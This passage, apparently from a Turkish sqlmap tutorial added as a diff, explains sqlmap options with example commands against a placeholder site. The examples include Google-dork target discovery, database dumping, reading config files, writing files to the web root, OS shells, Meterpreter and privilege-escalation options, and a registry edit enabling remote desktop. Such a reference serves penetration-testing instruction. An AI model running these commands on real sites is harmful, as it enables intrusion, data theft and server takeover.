+sqlmap -u "www.siteadi.com/testet.php?id=1" --dbs --parse-errors
+
+--pivot-column: Sqlmap'in limit/offset mekanizmasının çalışmadığı (nadir) ve tablo ya da kolon isimlerini çekemediği durumlarda kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" -D db -T tbl --pivot-column=userID
+
+--save:Kullandığımız ayarları, başka bir testimizde tekrar edeceksek ve/veya bunları tekrar kullanmak istiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" -dbs --threads=4 --level=3 --risk=3 --save
+
+--scope: Burpsuite gibi proxy log'larından elde ettiğimiz, test edeceğimiz sitelerimizi, python regexp ile ayrıştırmak için kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -l burpLog.log --scope="[w]{3}?[.]?.*[.]com[.]tr?" --dbs
+
+--test-filter: Sqlmap tarafından yapılacak testlerimizin payload'larının hepsinin değil de, bir filter'dan geçirdikten sonra kalan payload'lar tarafından yapılmasını istiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --test-filter=ROW --dbs --batch
+
+--update: Sqlmap'i güncellemek istiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap --update
+
+Miscellaneous Sekmesi:Geri kalan ne varsa bulunduran kategorimiz.
+
+-z: Sqlmap ile yazılan uzun kodlar sonrası, sqlmap'e kısaltma olarak eklenmiş parametremiz. Bunun ile daha kısa halde kodlarımızı yazabilmekteyiz. Örnek olarak ve karşılaştırması:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --batch --banner --dump -D db -T tbl
+sqlmap -u "www.siteadi.com/testet.php?id=1" -z="bat,ban,du,D=db,T=tbl"
+
+--alert: Sqlmap tarafından sql injection bulunduğu zaman çalıştırılmasını istediğimiz OS komutumuz/komutlarımız. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --alert=ls
+
+--answers: Sqlmap'in soracağı sorulara verilecek cevapları tanımladığımız parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --answers="quit=N,follow=N"
+
+--beep: Sqlmap tarafından sql injection bulunduğu zaman bilgisayarımızın biplemesini sağlayan komutumuz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --beep
+
+--cleanup: Sqlmap tarafından tanımlanan özel UDF'lar ve tabloları temizlemek için kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" -D db -T tbl --columns --cleanup
+
+--dependencies: Sqlmap dependencie'lerinin eksik olup olmadığını denetlemek için kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap --dependencies
+
+--disable-coloring: Sqlmap tarafından çıktılarda default olarak renklendirme yapılır. Eğer biz bu renklendirmeleri görmek istemiyorsak kullanabileceğimiz fonksiyonumuz. Örnek olarak:
+
+sqlmap --disable-coloring
+
+--gpage:Google dork ile arama yaparken, sayfa numarası belirterek aramayı kısıtlayabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -g ".php?id=" --gpage=3 --dbs
+
+--identify-waf: Test ettiğimiz sitemiz üzerinde bir WAF/IPS/IDS koruması olup olmadığını test etmek istiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --identify-waf
+
+ 
+
+
+
+--mobile: HTTP başlığı içerisinde gönderilen User-Agent değerini değiştirerek, kendimizi mobil bir cihazdan giriyormuş gibi göstermek istiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --mobile
+
+--page-rank: Google dork araması sonucu çıkan sonuçların page rank değerlerini bize döndüren parametremiz. Örnek olarak:
+
+sqlmap -g ".php?id=" --page-rank --dbs
+
+--purge-output: Sqlmap tarafından, site testi sonrası dump edilen verileri silmek istiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap --purge-output
+
+--smart: Sqlmap site üzerinde teste başlamadan önce, kendisine verilen parametreleri basit bir testle denetleyip injectable olup olmadığı bilgisini bize gösterir. Bu parametre ile, eğer basit test sonucunda muhtemelen başarısız olacağımız sonucu sqlmap tarafından bize bildirilirse, sqlmap o adresi taramaz.Örnek olarak:
+
+sqlmap -g ".php?id=" --smart --dbs
+
+--sqlmap-shell: Yazıldığı takdirde sqlmap shell'ine giriş yapabildiğimiz parametremiz.Örnek olarak:
+
+sqlmap --sqlmap-shell
+
+--wizard: Sqlmap ile alıştırmalara yeni başlayan, daha alışamayan ya da hangi parametreleri gireceğini bilemeyen kullanıcılarına adım adım değer sorarak, kullanıcının işini kolaylaştıran parametremiz. Örnek olarak:
+
+sqlmap --wizard
+
+--start: Dump işlemini hangi kayıttan itibaren yapacağımızı belirttiğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" -D db -T tbl --start=2
+
+--stop: Dump işlemini hangi kayıtta sonlandıracağımızı belirttiğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" -D db -T tbl --stop=10
+
+--first: Dump işlemini hangi karakterden itibaren yapacağımızı belirttiğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" -D db -T tbl --first=1
+
+--last: Dump işlemini hangi karakterde sonlandıracağımızı belirttiğimiz parametremiz.Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" -D db -T tbl --last=5
+
+--sql-query: Eğer injection testimiz başarılı ise hangi sql sorgusunu çalıştırmak istediğimizi belirttiğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" -D db --sql-query="SELECT * FROM tabloAdi"
+
+--sql-shell: Eğer injection testimiz başarılı ise sql shell'e girmemize yarayan komutumuz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" -D db --sql-shell
+
+--sql-file: Eğer injection testimiz başarılı ise, belirttiğimiz dosya içerisindeki sql sorgularını çalıştırmamızı sağlayan parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" -D db --sql-file=/dosya/yolu
+
+Bruteforce Sekmesi: Bruteforce ile denetlemeler için kullanabileceğimiz parametrelerin bulunduğu kategorimiz.
+
+--common-tables: Tablo isimleri herhangi bir sebeple çekilemediğinde ya da bu yolun daha hızlı olabileceğini düşündüğümüz durumlarda kullanabileceğimiz parametremiz. Sqlmap dosyası içerisinde tanımlı en çok kullanılan tabloların isimlerinin bulunduğu txt dosyasını okuyarak denemeler yapar.Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --common-tables
+
+--common-columns: Kolon isimleri herhangi bir sebeple çekilemediğinde ya da bu yolun daha hızlı olabileceğini düşündüğümüz durumlarda kullanabileceğimiz parametremiz. Sqlmap dosyası içerisinde tanımlı en çok kullanılan kolon isimlerinin bulunduğu txt dosyasını okuyarak denemeler yapar. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --common-columns
+
+
+ 
+
+
+
+User-Defined Function Injection Sekmesi: Kişisel kullanıcı tanımlı fonksiyonların tanımlandığı ve kullanıldığı parametrelerin bulunduğu kategorimiz.
+
+--udf-inject ve --shared-lib: Kullanıcının tanımladığı yol ve gösterdiği adımlar ile, injection testlerimizi yapmamızı sağlayan parametrelerimizdir. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --udf-inject -v 0
+sqlmap -u "www.siteadi.com/testet.php?id=1" --shared-lib=/shared/lib/yolu
+
+
+File System Access Sekmesi: Veritabanı yönetim sistemi altında yatan dosya sistemine erişmek için kullanabileceğimiz parametrelerin bulunduğu kategorimiz.
+
+--file-read: Test ettiğimiz sayfa üzerinde açık bulunduğu takdirde, erişim yetkimiz varsa, uzaktaki test edilen server üzerindeki belirttiğimiz yolda bulunan dosyayı okumak için kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --file-read="/var/www/html/config.php"
+
+--file-write ve --file-dest: Test ettiğimiz sayfa üzerinde açık bulunduğu takdirde, erişim yetkimiz varsa, uzaktaki test edilen server üzerindeki belirttiğimiz yolda bulunan klasör içerisine istediğimiz dosyayı yerleştirmek için kullanabileceğimiz parametrelermiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --file-write="yuklenecekDosya.txt" --file-dest="/var/www/html"
+
+
+Operation System Access Sekmesi: Veritabanı yönetim sistemi altında yatan işletim sistemine erişmek için kullanabileceğimiz parametrelerin bulunduğu kategorimiz
+
+--os-cmd: Test ettiğimiz sayfa üzerindeki açıktan faydalanıp, işletim sistemi üzerinde kod çalıştırabiliyor isek kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --os-cmd="ls"
+
+--os-shell: Test ettiğimiz sayfa üzerindeki açıklıktan faydalanıp, işletim sistemi üzerinde shell açma yetkimiz var ise kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --os-shell
+
+--os-pwn ve --msf-path: Test ettiğimiz sayfa üzerindeki açıklıktan faydalanıp, meterpreter shell'i açma işlemini denemek istiyorsak, kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --os-pwn --msf-path /****sploitDir/msf
+
+--os-smbrelay: Test ettiğimiz site üzerindeki açıklıktan faydalanıp, SMB Reflection Attack(MS08-068) kullanarak, meterpreter shell açmak için kullanabileceğimiz parametremiz.
+Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --os-smbrelay --msf-path /msf/dir
+
+--os-bof: Test ettiğimiz site üzerindeki açıklıktan faydalanıp, Microsoft SQL Server 2000 ve 2005 için geçerli, "sp_replwritetovarbin" ile (MS09-004) heap-based buffer overflow yardımı ile, meterpreter shell açmak için kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.asp?id=1" --os-bof --msf-path /msf/dir
+
+--priv-esc: Test ettiğimiz site üzerindeki açıklıktan faydalanıp, ****sploit'in "getsystem" komutu ile yetki yükseltme (MS10-015) faydalanarak, meterpreter shell açmak ve edinilen yetki ile işlemler denemek için kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --priv-esc --msf-path /msf/dir
+
+--tmp-path: Uzak sistemdeki yolu kullanabiliyorsak, buradaki dosya yolunu belirterek özellleştirilmiş işlemler yapabilmemizi sağlayan parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --tmp-path /uzak/msf/ --os-cmd="msfconsole"
+
+Windows Registry Access Sekmesi: Veritabanı yönetim sistemi altında yatan işletim sisteminin registry kayıtlarına erişmek için kullanabileceğimiz parametrelerin bulunduğu kategorimiz.
+
+--reg-read , --reg-key ve --reg-value: Test ettiğimiz site üzerindeki açıklıktan faydalanıp, registry dosyalarını okumamızı sağlayan parametremiz. Örnek olarak
+
+sqlmap -u "www.siteadi.com/testet.asp?id=1" --reg-read --reg-key="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" --reg-value=fDenyTSConnections
+
+--reg-add , --reg-type ve --reg-data: Test ettiğimiz site üzerindeki açıklıktan faydalanıp, registry kaydı eklemek için kullanılabilecek parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.asp?id=1" --reg-add --reg-key="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" --reg-value=fDenyTSConnections --reg-type=DWORD --reg-data=0
+
+
+General Sekmesi: Sqlmap tarafından kullanılacak bazı genel parametrelerin bulunduğu kategorimiz.
+
+-s: Belirtilen .sqlite dosyası içerisinde kayıtlı session değerini yüklememizi ve işlemimize kaldığımız yerden devam etmemizde yardımcı olan fonksiyonumuz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" -s /sqlite/yolu --dbs
+
+-t: Injection testlerinde yapılan tüm HTTP trafiğini, bir dosya içerisine kaydetmek istiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" -t /kayit/yolu/kaydet.txt --dbs
+
+--batch: Sqlmap'in input gerektiren bazı durumlarında, kullanıcı inputunu istemeden, sqlmap tarafından tanımlı default değerlere göre devam etmesini sağlayan parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --dbs --batch
+
+--charset: Eğer test gerçekleştirdiğimiz site üzerinde bir açık mevcutsa ve bu açık ile veri çekilebiliyorsa, veri çekilirken character encoding olarak ne kullanacağımızı sqlmap'e bildirebileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --dbs --charset=utf8
+
+--crawl: Verilen URL'den başlayarak, siteyi crawl etmemize yardımcı olan parametremiz. Değer olarak Crawl Depth alır. Crawl Depth arttıkça, işlemimiz uzar. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --dbs --crawl=3
+
+--csv-del: Dosyalar CSV(yani excel tablolarında kullandığımız format) olarak kaydedilirken, kolonlar arasındaki virgül'e göre ayrıştırılıp tablolara yerleştirilir. Bu parametremizi de default ayrıştırma olan virgül yerine belirttiğimiz bir simge ile yapabilmemizde yardımcı olur. Örnek
+olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --csv-del="&"
+
+--dump-format: Sqlmap default olarak çıktı gösterme işlemini csv formatı halinde vermektedir. Eğer biz bunun, HTML ya da SQLITE olarak dump edilmesini istiyorsak, kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --dump-format=HTML
+
